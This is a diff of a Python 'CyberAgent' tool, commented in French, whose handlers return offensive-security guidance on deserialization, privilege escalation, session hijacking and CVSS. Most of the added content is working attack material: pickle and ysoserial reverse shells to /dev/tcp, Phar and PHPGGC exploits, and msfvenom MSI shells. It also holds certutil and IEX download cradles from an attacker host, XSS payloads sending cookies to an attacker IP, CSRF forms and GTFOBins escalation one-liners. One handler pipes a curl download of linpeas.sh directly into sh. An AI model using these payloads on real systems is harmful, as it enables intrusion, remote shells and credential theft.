+            "  PHP    : libxml_disable_entity_loader(true)\n"
+            "  Java   : XMLInputFactory.IS_SUPPORTING_EXTERNAL_ENTITIES = false\n"
+            "  Python : defusedxml à la place de xml.etree.ElementTree\n"
+            "  .NET   : XmlReaderSettings.DtdProcessing = DtdProcessing.Prohibit",
+            {"domain": "xxe", "attacker": attacker_ip})
+
+    # ══════════════════════════════════════════════════════════════════════════
+    # DOMAINE 13 — DÉSÉRIALISATION
+    # ══════════════════════════════════════════════════════════════════════════
+
+    def _handle_deserialize(self, task: str) -> dict:
+        t = task.lower()
+        lhost = self._extract_ip(task) or "10.10.10.10"
+        lport = self._extract_port(task) or "4444"
+
+        if any(kw in t for kw in ["java", "ysoserial"]):
+            return self._result(True,
+                "💣 DÉSÉRIALISATION JAVA — ysoserial / gadget chains\n\n"
+                "IDENTIFIER LA VULNÉRABILITÉ :\n"
+                "  Content-Type: application/x-java-serialized-object\n"
+                "  Magic bytes : AC ED 00 05 (hex) = rO0AB (base64)\n"
+                "  Ports Java : RMI (1099), JMX (9010), AMF (8400)\n\n"
+                "YSOSERIAL — générer des payloads :\n"
+                f"  java -jar ysoserial.jar CommonsCollections6 'bash -c \"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1\"' | base64\n\n"
+                "GADGET CHAINS COMMUNES :\n"
+                "  CommonsCollections1/3/5/6 → Apache Commons Collections\n"
+                "  Spring1/Spring2           → Spring Framework\n"
+                "  Hibernate1/Hibernate2     → Hibernate ORM\n"
+                "  URLDNS                    → test OOB (safe, juste DNS)\n"
+                "  JRMPClient                → RMI exploit\n\n"
+                "ATTAQUE RMI :\n"
+                "  # JRMP listener + payload\n"
+                f"  java -cp ysoserial.jar ysoserial.exploit.JRMPListener {lport} CommonsCollections6 'cmd'\n"
+                f"  java -jar ysoserial.jar JRMPClient {lhost}:{lport}\n\n"
+                "SPRING BOOT ACTUATOR (/env + /restart) :\n"
+                "  POST /actuator/env → injecter spring.cloud.bootstrap.location\n"
+                "  POST /actuator/refresh → déclencher désérialisation\n\n"
+                "REMÉDIATION :\n"
+                "  ObjectInputFilter (Java 9+) pour whitelist de classes\n"
+                "  Mettre à jour Commons Collections\n"
+                "  Désactiver la désérialisation native si possible",
+                {"domain": "deserialize", "lang": "java", "lhost": lhost, "lport": lport})
+
+        if "php" in t:
+            return self._result(True,
+                "💣 DÉSÉRIALISATION PHP — unserialize()\n\n"
+                "IDENTIFIER :\n"
+                "  Cookies ou paramètres qui contiennent : O:4:\"User\":2:{...}\n"
+                "  Fonctions vulnérables : unserialize(), __wakeup(), __destruct()\n\n"
+                "PAYLOAD BASIQUE :\n"
+                "  class Shell {\n"
+                "    public $cmd;\n"
+                "    function __destruct() { system($this->cmd); }\n"
+                "  }\n"
+                "  $obj = new Shell();\n"
+                "  $obj->cmd = 'id';\n"
+                "  echo serialize($obj);\n"
+                "  // → O:5:\"Shell\":1:{s:3:\"cmd\";s:2:\"id\";}\n\n"
+                "PHAR DESERIALIZE (upload + read) :\n"
+                "  $phar = new Phar('evil.phar');\n"
+                "  $phar->startBuffering();\n"
+                "  $phar->addFromString('test.txt', 'test');\n"
+                "  $phar->setStub('<?php __HALT_COMPILER(); ?>');\n"
+                "  $phar->setMetadata($obj);  // objet malveillant\n"
+                "  $phar->stopBuffering();\n"
+                "  # Renommer en .jpg et uploader\n"
+                "  # Déclencher via : file_exists('phar://uploads/evil.jpg')\n\n"
+                "PHPGGC — générateur de gadget chains PHP :\n"
+                "  ./phpggc -l                           → lister toutes les chains\n"
+                "  ./phpggc Laravel/RCE5 system 'id'    → Laravel gadget\n"
+                "  ./phpggc Symfony/RCE4 system 'id'    → Symfony gadget\n\n"
+                "REMÉDIATION :\n"
+                "  Remplacer unserialize() par json_decode()\n"
+                "  Whitelist de classes autorisées\n"
+                "  Valider et signer les données sérialisées",
+                {"domain": "deserialize", "lang": "php"})
+
+        if "python" in t or "pickle" in t:
+            lhost2 = lhost; lport2 = lport
+            return self._result(True,
+                "💣 DÉSÉRIALISATION PYTHON — pickle\n\n"
+                "IDENTIFIER :\n"
+                "  Tout appel à pickle.loads() sur des données non-fiables\n"
+                "  Magic bytes pickle : \\x80\\x04\\x95 (protocole 4)\n\n"
+                "PAYLOAD RCE :\n"
+                "import pickle, os, base64\n\n"
+                "class Exploit(object):\n"
+                "    def __reduce__(self):\n"
+                f"        return (os.system, ('bash -c \"bash -i >& /dev/tcp/{lhost2}/{lport2} 0>&1\"',))\n\n"
+                "payload = pickle.dumps(Exploit())\n"
+                f"print(base64.b64encode(payload).decode())\n\n"
+                "# Sur la cible :\n"
+                "# pickle.loads(base64.b64decode('<votre_payload>'))\n\n"
+                "VARIANTE avec exec() :\n"
+                "class Exploit(object):\n"
+                "    def __reduce__(self):\n"
+                "        return (exec, ('import os;os.system(\"id\")',))\n\n"
+                "REMÉDIATION :\n"
+                "  Ne jamais faire pickle.loads() sur des données réseau\n"
+                "  Utiliser json, msgpack, ou Protocol Buffers\n"
+                "  Si pickle obligatoire : HMAC pour signature",
+                {"domain": "deserialize", "lang": "python", "lhost": lhost, "lport": lport})
+
+        return self._result(True,
+            "💣 DÉSÉRIALISATION — Langages couverts\n\n"
+            "  java deserialization  → ysoserial, gadget chains (CommonsCollections, Spring)\n"
+            "  php unserialize       → PHPGGC, magic methods __destruct/__wakeup\n"
+            "  python pickle         → __reduce__ payload RCE\n"
+            "  .net deserialization  → Json.NET TypeNameHandling, BinaryFormatter\n\n"
+            "Précise le langage pour le payload complet.",
+            {"domain": "deserialize"})
+
+    # ══════════════════════════════════════════════════════════════════════════
+    # DOMAINE 14 — PRIVILEGE ESCALATION (Linux & Windows)
+    # ══════════════════════════════════════════════════════════════════════════
+
+    def _handle_privesc(self, task: str) -> dict:
+        t = task.lower()
+
+        # LinPEAS — lancer directement
+        if any(kw in t for kw in ["linpeas"]):
+            cmd = "curl -sL https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh"
+            result = self._run_command(cmd, task)
+            if not result.get("success"):
+                local_cmd = "bash /tmp/linpeas.sh 2>/dev/null || wget -qO /tmp/linpeas.sh https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh && chmod +x /tmp/linpeas.sh && bash /tmp/linpeas.sh"
+                return self._run_command(local_cmd, task)
+            return result
+
+        # WinPEAS — info + download
+        if "winpeas" in t:
+            return self._result(True,
+                "🔺 WINPEAS — Windows Privilege Escalation Awesome Script\n\n"
+                "TÉLÉCHARGEMENT :\n"
+                "  cmd> certutil -urlcache -f http://<ATTACKER>/winpeas.exe winpeas.exe\n"
+                "  PS>  Invoke-WebRequest -Uri http://<ATTACKER>/winpeas.exe -OutFile wp.exe\n"
+                "  PS>  IEX (New-Object Net.WebClient).DownloadString('http://<ATTACKER>/winpeas.ps1')\n\n"
+                "EXÉCUTION :\n"
+                "  winpeas.exe                  → tout scanner\n"
+                "  winpeas.exe quiet            → sans couleurs (logs)\n"
+                "  winpeas.exe systeminfo       → infos système\n"
+                "  winpeas.exe servicesinfo     → services vulnérables\n"
+                "  winpeas.exe userinfo         → utilisateurs/groupes\n\n"
+                "VERSIONS :\n"
+                "  winPEASx64.exe / winPEASx86.exe / winPEAS.bat / winPEAS.ps1\n"
+                "  https://github.com/peass-ng/PEASS-ng/releases",
+                {"domain": "privesc", "os": "windows", "tool": "winpeas"})
+
+        # SUID
+        if any(kw in t for kw in ["suid", "suid bit"]):
+            cmd = "find / -perm -4000 -type f 2>/dev/null"
+            result = self._run_command(cmd, task)
+            # Ajouter gtfobins hint
+            out = result.get("output", "") + (
+                "\n\n🔗 GTFOBins — exploitation SUID :\n"
+                "  https://gtfobins.github.io/?q=&type=suid\n\n"
+                "COMMANDES COURANTES EXPLOITABLES :\n"
+                "  bash   → bash -p\n"
+                "  find   → find . -exec /bin/bash -p \\;\n"
+                "  vim    → :!bash\n"
+                "  python → python3 -c 'import os; os.execl(\"/bin/bash\", \"bash\", \"-p\")'\n"
+                "  cp     → cp /bin/bash /tmp/bash; chmod +s /tmp/bash; /tmp/bash -p\n"
+                "  nmap   → nmap --interactive → !sh (version ancienne)"
+            )
+            return self._result(result.get("success", True), out, {"domain": "privesc", "check": "suid"})
+
+        # sudo -l
+        if any(kw in t for kw in ["sudo", "sudo -l"]):
+            result = self._run_command("sudo -l 2>/dev/null", task)
+            out = result.get("output", "") + (
+                "\n\n🔗 GTFOBins — exploitation sudo :\n"
+                "  https://gtfobins.github.io/?q=&type=sudo\n\n"
+                "PATTERNS DANGEREUX :\n"
+                "  (ALL) NOPASSWD: ALL              → sudo bash\n"
+                "  (ALL) /bin/vim                   → sudo vim -c ':!bash'\n"
+                "  (ALL) /usr/bin/python*           → sudo python -c 'import os; os.system(\"/bin/bash\")'\n"
+                "  (ALL) /usr/bin/find              → sudo find / -exec bash -i \\; -quit\n"
+                "  (ALL) /bin/cp                    → copier /bin/bash avec SUID\n"
+                "  (user) /usr/bin/awk              → sudo awk 'BEGIN {system(\"/bin/bash\")}'"
+            )
+            return self._result(result.get("success", True), out, {"domain": "privesc", "check": "sudo"})
+
+        # Capabilities
+        if any(kw in t for kw in ["getcap", "capabilities"]):
+            result = self._run_command("getcap -r / 2>/dev/null", task)
+            out = result.get("output", "") + (
+                "\n\nCAPACITÉS DANGEREUSES :\n"
+                "  cap_setuid   → élévation directe\n"
+                "  cap_net_raw  → sniffing réseau\n"
+                "  cap_sys_admin→ montage, namespaces\n"
+                "  python3 cap_setuid+ep → python3 -c \"import os; os.setuid(0); os.execl('/bin/sh', 'sh')\""
+            )
+            return self._result(result.get("success", True), out, {"domain": "privesc", "check": "capabilities"})
+
+        # Cron writable
+        if any(kw in t for kw in ["cron", "writable cron"]):
+            cmd = "cat /etc/crontab 2>/dev/null; ls /etc/cron* 2>/dev/null; find / -writable -name '*.sh' 2>/dev/null | head -20"
+            return self._run_command(cmd, task)
+
+        # Windows — Token impersonation / Potatoes
+        if any(kw in t for kw in ["token impersonation", "juicy potato", "printspoofer", "sweet potato", "rogue potato"]):
+            return self._result(True,
+                "🔺 WINDOWS PRIVESC — Token Impersonation & Potatoes\n\n"
+                "PRÉREQUIS : SeImpersonatePrivilege ou SeAssignPrimaryTokenPrivilege\n"
+                "  whoami /priv → vérifier les privilèges\n\n"
+                "PRINTSPOOFER (Windows 10/2019, le plus fiable) :\n"
+                "  PrintSpoofer.exe -i -c cmd\n"
+                "  PrintSpoofer.exe -c \"nc.exe 10.10.10.10 4444 -e cmd\"\n\n"
+                "JUICY POTATO (Windows 2019 et avant) :\n"
+                "  JuicyPotato.exe -l 1337 -p c:\\windows\\system32\\cmd.exe -t * -c {CLSID}\n"
+                "  # CLSID : https://github.com/ohpe/juicy-potato/tree/master/CLSID\n\n"
+                "SWEET POTATO / ROGUE POTATO (Win10 patché) :\n"
+                "  SweetPotato.exe -a \"whoami\"\n\n"
+                "ALWAYS INSTALL ELEVATED :\n"
+                "  reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated\n"
+                "  reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated\n"
+                "  # Si 0x1 :\n"
+                "  msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f msi -o evil.msi\n"
+                "  msiexec /quiet /qn /i evil.msi\n\n"
+                "UNQUOTED SERVICE PATHS :\n"
+                "  wmic service get name,displayname,pathname,startmode | findstr /i \"auto\" | findstr /i /v \"c:\\windows\\\\\"\n"
+                "  # Si chemin non quoté avec espace → placer executable dans chemin tronqué",
+                {"domain": "privesc", "os": "windows"})
+
+        # Guide complet
+        checklist = (
+            "🔺 PRIVILEGE ESCALATION — Checklist\n\n"
+            "LINUX :\n"
+            "  linpeas              → scan automatique complet\n"
+            "  sudo -l              → commandes sudo sans mot de passe\n"
+            "  suid bit             → find / -perm -4000 -type f 2>/dev/null\n"
+            "  getcap linux         → getcap -r / 2>/dev/null\n"
+            "  writable cron        → cat /etc/crontab; find / -writable -name '*.sh'\n"
+            "  /etc/passwd writable → ajouter root2::\n"
+            "  /etc/shadow read     → hashcat sur les hashes\n"
+            "  docker group         → docker run -v /:/mnt ubuntu chroot /mnt sh\n"
+            "  lxd group            → monter le filesystem complet\n"
+            "  NFS no_root_squash   → monter + créer SUID\n"
+            "  kernel exploit       → searchsploit $(uname -r)\n\n"
+            "WINDOWS :\n"
+            "  winpeas              → scan automatique complet\n"
+            "  token impersonation  → PrintSpoofer, JuicyPotato, SweetPotato\n"
+            "  always install elevated → MSI payload SYSTEM\n"
+            "  unquoted service paths → exe dans chemin tronqué\n"
+            "  weak service perms   → accesschk.exe → changer binPath\n"
+            "  AutoRuns             → DLL hijacking via startup\n"
+            "  SAM/SYSTEM dump      → reg save HKLM\\SAM /tmp/sam.hive\n"
+            "  SeDebugPrivilege     → inject SYSTEM process\n\n"
+            "Précise le contexte (linpeas / winpeas / suid / sudo / cron / token) pour lancer."
+        )
+        return self._result(True, checklist, {"domain": "privesc"})
+
+    # ══════════════════════════════════════════════════════════════════════════
+    # DOMAINE 15 — SESSION HIJACKING & CSRF
+    # ══════════════════════════════════════════════════════════════════════════
+
+    def _handle_session_hijack(self, task: str) -> dict:
+        t = task.lower()
+        attacker = self._extract_ip(task) or "10.10.10.10"
+
+        if any(kw in t for kw in ["csrf", "forged request"]):
+            return self._result(True,
+                "💣 CSRF — Cross-Site Request Forgery\n\n"
+                "DÉTECTION :\n"
+                "  Absence de token CSRF dans les formulaires/requêtes\n"
+                "  Vérifier : X-CSRF-Token, CSRF_TOKEN, _token, authenticity_token\n"
+                "  Tester : changer la méthode GET/POST, supprimer le token, rejouer\n\n"
+                "PAYLOAD HTML (changement d'email) :\n"
+                "<html><body>\n"
+                "  <form action=\"https://victim.com/account/email\" method=\"POST\">\n"
+                "    <input type=\"hidden\" name=\"email\" value=\"attacker@evil.com\">\n"
+                "    <input type=\"submit\" value=\"Click\">\n"
+                "  </form>\n"
+                "  <script>document.forms[0].submit();</script>\n"
+                "</body></html>\n\n"
+                "CSRF JSON (si Content-Type: text/plain accepté) :\n"
+                "<form method=\"POST\" action=\"https://victim.com/api/update\"\n"
+                "      enctype=\"text/plain\">\n"
+                "  <input name='{\"email\":\"x@evil.com\",\"x\":\"' value=\"'}\">\n"
+                "</form>\n\n"
+                "CSRF + fetch (si cookie SameSite=None) :\n"
+                "<script>\n"
+                "fetch('https://victim.com/account/email', {\n"
+                "  method: 'POST',\n"
+                "  credentials: 'include',\n"
+                "  headers: {'Content-Type': 'application/x-www-form-urlencoded'},\n"
+                "  body: 'email=attacker@evil.com'\n"
+                "});\n"
+                "</script>\n\n"
+                "REMÉDIATION :\n"
+                "  Token CSRF synchronisé (double submit cookie)\n"
+                "  SameSite=Strict sur les cookies de session\n"
+                "  Vérification de l'en-tête Origin/Referer",
+                {"domain": "session", "attack": "csrf"})
+
+        if any(kw in t for kw in ["cookie", "session fixation", "vol de session", "vol de cookie"]):
+            return self._result(True,
+                "💣 SESSION HIJACKING & COOKIE THEFT\n\n"
+                "VOL DE COOKIE VIA XSS :\n"
+                f"<script>document.location='http://{attacker}/steal?c='+document.cookie</script>\n"
+                f"<img src=x onerror=\"fetch('http://{attacker}/?c='+document.cookie)\">\n"
+                f"<svg onload=\"new Image().src='http://{attacker}/?'+document.cookie\">\n\n"
+                f"SERVEUR POUR CATCHER :\n"
+                f"  nc -lvnp 80     # ou python3 -m http.server 80\n\n"
+                "SESSION FIXATION :\n"
+                "  1. Obtenir un session ID valide (avant login)\n"
+                "  2. Forcer la victime à utiliser ce session ID :\n"
+                "     http://victim.com/login?PHPSESSID=attacker_controlled_id\n"
+                "  3. Quand la victime se connecte, le session ID est recyclé\n"
+                "     si l'appli ne régénère pas le session ID post-login\n\n"
+                "ANALYSE DE COOKIES :\n"
+                "  Flags manquants à tester :\n"
+                "    HttpOnly absent → vol via XSS\n"
+                "    Secure absent   → interception HTTP\n"
+                "    SameSite absent → CSRF possible\n\n"
+                "  Vérifier l'entropie :\n"
+                "    hashcat --show -m 0 <cookie>  → préfixe connu ?\n"
+                "    python3 -c \"import base64; print(base64.b64decode('<cookie>'))\"  → données sérialisées ?\n\n"
+                "TOKEN REPLAY :\n"
+                "  JWT expiré → modifier exp dans payload, re-signer avec alg:none\n"
+                "  Bearer token → rejouer dans Burp / curl\n"
+                "  OAuth refresh_token → persiste souvent > 30 jours\n\n"
+                "OUTILS :\n"
+                "  Burp Suite → Repeater pour rejouer les requêtes\n"
+                "  EditThisCookie (extension) → modifier les cookies\n"
+                "  jwt.io / jwt_tool → décoder et modifier les JWT",
+                {"domain": "session", "attack": "hijacking"})
+
+        return self._result(True,
+            "💣 SESSION HIJACKING — Techniques\n\n"
+            "  csrf attack          → forger des requêtes authentifiées\n"
+            "  cookie stealing      → XSS → vol de cookie → usurpation\n"
+            "  session fixation     → forcer un session ID connu\n"
+            "  token replay         → rejouer JWT/OAuth/Bearer\n\n"
+            "Précise la technique pour le code complet.",
+            {"domain": "session"})
+
+    # ══════════════════════════════════════════════════════════════════════════
+    # DOMAINE 16 — CVSS SCORING (v3.1 & v4.0)
+    # ══════════════════════════════════════════════════════════════════════════
+
+    def _handle_cvss(self, task: str) -> dict:
+        t = task.lower()
+        is_v4 = "v4" in t or "cvss 4" in t
+        version = "4.0" if is_v4 else "3.1"
+        return self._result(True,
+            f"📊 CVSS {version} — CALCULATEUR DE SCORE\n\n"
+            + ("CVSS v4.0 (2023) — NOUVEAUTÉS vs v3.1 :\n"
+               "  4 types de scores : Base / Threat / Environmental / Supplemental\n"
+               "  Nomenclature : CVSS-BT (Base+Threat), CVSS-BE (Base+Environmental)\n"
+               "  Attack Requirements (AR) remplace Attack Complexity (AC)\n"
+               "  Nouvelles métriques : Provider Urgency, Recovery, Safety\n\n"
+               if is_v4 else "") +
+            "VECTEUR DE BASE (CVSS v3.1) :\n\n"
+            "  AV  Attack Vector      : N(etwork)/A(djacent)/L(ocal)/P(hysical)\n"
+            "  AC  Attack Complexity  : L(ow)/H(igh)\n"
+            "  PR  Privileges Required: N(one)/L(ow)/H(igh)\n"
+            "  UI  User Interaction   : N(one)/R(equired)\n"
+            "  S   Scope              : U(nchanged)/C(hanged)\n"
+            "  C   Confidentiality    : N(one)/L(ow)/H(igh)\n"
+            "  I   Integrity          : N(one)/L(ow)/H(igh)\n"
+            "  A   Availability       : N(one)/L(ow)/H(igh)\n\n"
+            "SCORES DE SÉVÉRITÉ :\n"
+            "  0.0        → None\n"
+            "  0.1 – 3.9  → Low\n"
+            "  4.0 – 6.9  → Medium\n"
+            "  7.0 – 8.9  → High\n"
+            "  9.0 – 10.0 → Critical\n\n"
+            "EXEMPLES DE VECTEURS :\n"
+            "  RCE remote non-auth, pas de UI, haute impact :\n"
+            "    CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H → 10.0 Critical\n\n"
+            "  SQLi avec accès réseau, auth requise :\n"
+            "    CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N → 8.1 High\n\n"
+            "  XSS stored, user interaction requise :\n"
+            "    CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N → 6.1 Medium\n\n"
+            "  LFI local, accès limité :\n"
+            "    CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N → 6.5 Medium\n\n"
+            "CALCULATEURS :\n"
+            "  https://www.first.org/cvss/calculator/3.1\n"
+            "  https://www.first.org/cvss/calculator/4.0\n"
+            "  nvd.nist.gov → base de CVEs avec scores officiels\n\n"
+            "CVSS TEMPOREL (optionnel) :\n"
+            "  E  Exploit Code Maturity : U/P/F/H\n"
+            "  RL Remediation Level     : O/T/W/U\n"
+            "  RC Report Confidence     : U/R/C\n\n"
+            "POUR CALCULER : donne-moi les métriques AV/AC/PR/UI/S/C/I/A\n"
+            "et je calcule le score exact.",
+            {"domain": "cvss", "version": version})
 
 
 cyber_agent = CyberAgent()
